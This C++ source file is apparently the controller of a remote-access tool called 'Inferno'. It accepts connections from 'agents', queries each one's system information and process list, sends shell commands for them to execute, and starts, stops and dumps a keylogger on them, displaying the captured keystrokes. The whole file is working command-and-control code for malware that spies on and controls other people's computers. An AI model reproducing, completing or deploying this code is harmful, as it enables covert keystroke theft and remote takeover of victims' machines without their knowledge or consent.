#include "../include/server.hpp"
#include <iostream>
#include <algorithm> // To use std::remove_if
#include <iomanip>
#include <arpa/inet.h>
#include "../../common/include/Packet.hpp"

namespace inferno {


Server::Server(uint16_t port, QObject* parent) 
    : QObject(parent), m_port(port), m_running(false) {}

Server::~Server() {
    stop();
}

// Core functionalities

bool Server::start() {
    // Bind the listening socket to the specified IP and port
    if (!m_listen_socket.bindNode("0.0.0.0", m_port)) {
        emit statusMessage(QString("Error: bindNode failed on port %1").arg(m_port));
        return false;
    }

    // Put the listening socket in listening mode
    if (!m_listen_socket.listen()) {
        std::cerr << "[Server] listen() failed\n";
        return false;
    }

    // Retrieve the actual bound port (crucial if port 0 was requested for dynamic assignment)
    m_port = m_listen_socket.getPort();

    m_running = true;
    emit statusMessage(QString("Inferno Server listening on port %1").arg(m_port));
    return true;
}

void Server::run() {
    if (!m_running) {
        std::cerr << "[Server] Call start() before run()\n";
        return;
    }

    while (m_running) {

        // Build the fd_set
        // fd_set is the set of file descriptors that select() will monitor.
        // We rebuild it at each turn because select() modifies it.

        fd_set read_fds;
        FD_ZERO(&read_fds); // Clear the set

        // Add the listening socket to the set
        FD_SET(m_listen_socket.getFd(), &read_fds);
        int max_fd = m_listen_socket.getFd(); // select() needs the largest fd

        // Add all connected clients to the set
        for (const auto& client : m_clients) {
            FD_SET(client.socket.getFd(), &read_fds);
            if (client.socket.getFd() > max_fd)
                max_fd = client.socket.getFd();
        }

        // Call select()
        struct timeval timeout;
        timeout.tv_sec  = 1;
        timeout.tv_usec = 0;

        int activity = ::select(max_fd + 1, &read_fds, nullptr, nullptr, &timeout);

        if (activity < 0) {
            std::cerr << "[Server] select() error\n";
            break;
        }

        // New client connection
        if (FD_ISSET(m_listen_socket.getFd(), &read_fds)) {
            auto new_socket = m_listen_socket.acceptNode();
            if (new_socket.has_value()) {
                emit statusMessage(QString("New Agent Connected: %1").arg(QString::fromStdString(new_socket->getIp())));
                
                // Immediately request system info (Phase 3 requirement)
                Packet req(static_cast<uint16_t>(Opcode::SYS_REQ_INFO), "");
                std::vector<uint8_t> data = req.serialize();
                new_socket->sendData(data);

                m_clients.push_back({std::move(*new_socket), {}});
            }
        }

        // Existing client data
        std::vector<int> to_remove;
        for (auto& client : m_clients) {
            if (FD_ISSET(client.socket.getFd(), &read_fds)) {
                std::vector<uint8_t> raw_chunk;
                ssize_t bytes = client.socket.receiveData(raw_chunk, 4096);

                if (bytes <= 0) {
                    emit agentDisconnected(QString::fromStdString(client.socket.getIp()));
                    to_remove.push_back(client.socket.getFd());
                } else {
                    // Accumulate data
                    client.buffer.insert(client.buffer.end(), raw_chunk.begin(), raw_chunk.end());
                    processPacketBuffer(client);
                }
            }
        }

        // Clean up disconnected clients
        m_clients.erase(
            std::remove_if(m_clients.begin(), m_clients.end(),
                [&to_remove](const ClientContext& ctx) {
                    return std::find(to_remove.begin(), to_remove.end(), ctx.socket.getFd())
                           != to_remove.end();
                }),
            m_clients.end()
        );
    }
}

void Server::stop() {
    m_running = false;
    m_clients.clear(); 
}

// Getters

bool     Server::isRunning() const { return m_running; }
uint16_t Server::getPort()   const { return m_port; }

// Static Protocol Helper (Option B)
void Server::processPacketBuffer(ClientContext& client) {
    while (true) {
        auto packet_opt = ::inferno::Packet::deserialize(client.buffer);
        if (!packet_opt.has_value()) {
            break; // Not enough data for a full packet yet
        }

        // Dispatch Packet
        uint16_t opcode = packet_opt->getOpcode();
        const auto& payload = packet_opt->getPayload();
        std::string payload_str(payload.begin(), payload.end());

        if (opcode == static_cast<uint16_t>(Opcode::SYS_RES_INFO)) {
            emit agentConnected(QString::fromStdString(client.socket.getIp()), QString::fromStdString(payload_str));
            
            Packet req(static_cast<uint16_t>(Opcode::PROC_LIST_REQ), "");
            client.socket.sendData(req.serialize());

        } else if (opcode == static_cast<uint16_t>(Opcode::CMD_RES)) {
            QString output = QString::fromStdString(sanitizeOutput(payload_str, 3, payload_str.size()-3));
            if (output.isEmpty()) {
                output = "[COMMAND COMPLETED WITH NO OUTPUT]";
            }
            emit shellOutputReceived(QString::fromStdString(client.socket.getIp()), output);
        } else if (opcode == static_cast<uint16_t>(Opcode::PROC_LIST_RES)) {
            // Binary Parse: [U16 Page][U8 Last][U16 Count] ... [U32 PID][U16 Len][Name]
            if (payload.size() >= 5) {
                uint16_t count = (static_cast<uint16_t>(payload[3]) << 8) | payload[4];
                QString output = "\n--- REMOTE PROCESS LIST ---\nPID\tNAME\n";
                size_t offset = 5;
                for (uint16_t i = 0; i < count && offset + 6 <= payload.size(); ++i) {
                    uint32_t pid = (static_cast<uint32_t>(payload[offset]) << 24) |
                                   (static_cast<uint32_t>(payload[offset+1]) << 16) |
                                   (static_cast<uint32_t>(payload[offset+2]) << 8) |
                                   static_cast<uint32_t>(payload[offset+3]);
                    uint16_t nlen = (static_cast<uint16_t>(payload[offset+4]) << 8) | payload[offset+5];
                    offset += 6;
                    if (offset + nlen <= payload.size()) {
                        std::string name(reinterpret_cast<const char*>(&payload[offset]), nlen);
                        output += QString("%1\t%2\n").arg(pid).arg(QString::fromStdString(name));
                        offset += nlen;
                    }
                }
                emit shellOutputReceived(QString::fromStdString(client.socket.getIp()), output);
            }
        } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_DATA)) {
            emit keylogReceived(QString::fromStdString(client.socket.getIp()), 
                               QString::fromStdString(sanitizeOutput(payload_str, 12, payload_str.size()-12)));
        }

        // Remove processed bytes from the buffer
        size_t packet_size = sizeof(PacketHeader) + payload.size();
        client.buffer.erase(client.buffer.begin(), client.buffer.begin() + packet_size);
    }
}

std::string Server::sanitizeOutput(const std::string& s, size_t offset, size_t len) {
    std::string out;
    out.reserve(len);
    for (size_t i = offset; i < offset + len && i < s.size(); ++i) {
        const unsigned char c = static_cast<unsigned char>(s[i]);
        // Strip control characters except newline, carriage return, and tab
        if (c == '\n' || c == '\r' || c == '\t' || (c >= 0x20 && c != 0x7F)) {
            out.push_back(static_cast<char>(c));
        }
    }
    return out;
}

void Server::sendShellCommand(const QString& ip, const QString& cmd) {
    for (auto& client : m_clients) {
        if (QString::fromStdString(client.socket.getIp()) == ip) {
            std::string cmd_str = cmd.toStdString();
            std::string payload;
            uint16_t len = static_cast<uint16_t>(cmd_str.size());
            payload.push_back(static_cast<char>((len >> 8) & 0xFF));
            payload.push_back(static_cast<char>(len & 0xFF));
            payload.append(cmd_str);
            
            Packet p(static_cast<uint16_t>(Opcode::CMD_EXEC), payload);
            client.socket.sendData(p.serialize());
            break;
        }
    }
}

void Server::requestProcessList(const QString& ip) {
    for (auto& client : m_clients) {
        if (QString::fromStdString(client.socket.getIp()) == ip) {
            Packet p(static_cast<uint16_t>(Opcode::PROC_LIST_REQ), "");
            client.socket.sendData(p.serialize());
            break;
        }
    }
}

void Server::toggleKeylogger(const QString& ip, bool active) {
    for (auto& client : m_clients) {
        if (QString::fromStdString(client.socket.getIp()) == ip) {
            Opcode op = active ? Opcode::KEYLOG_START : Opcode::KEYLOG_STOP;
            Packet p(static_cast<uint16_t>(op), "");
            client.socket.sendData(p.serialize());
            break;
        }
    }
}

void Server::requestKeylogDump(const QString& ip) {
    for (auto& client : m_clients) {
        if (QString::fromStdString(client.socket.getIp()) == ip) {
            Packet p(static_cast<uint16_t>(Opcode::KEYLOG_DUMP), "");
            client.socket.sendData(p.serialize());
            break;
        }
    }
}

} // namespace inferno
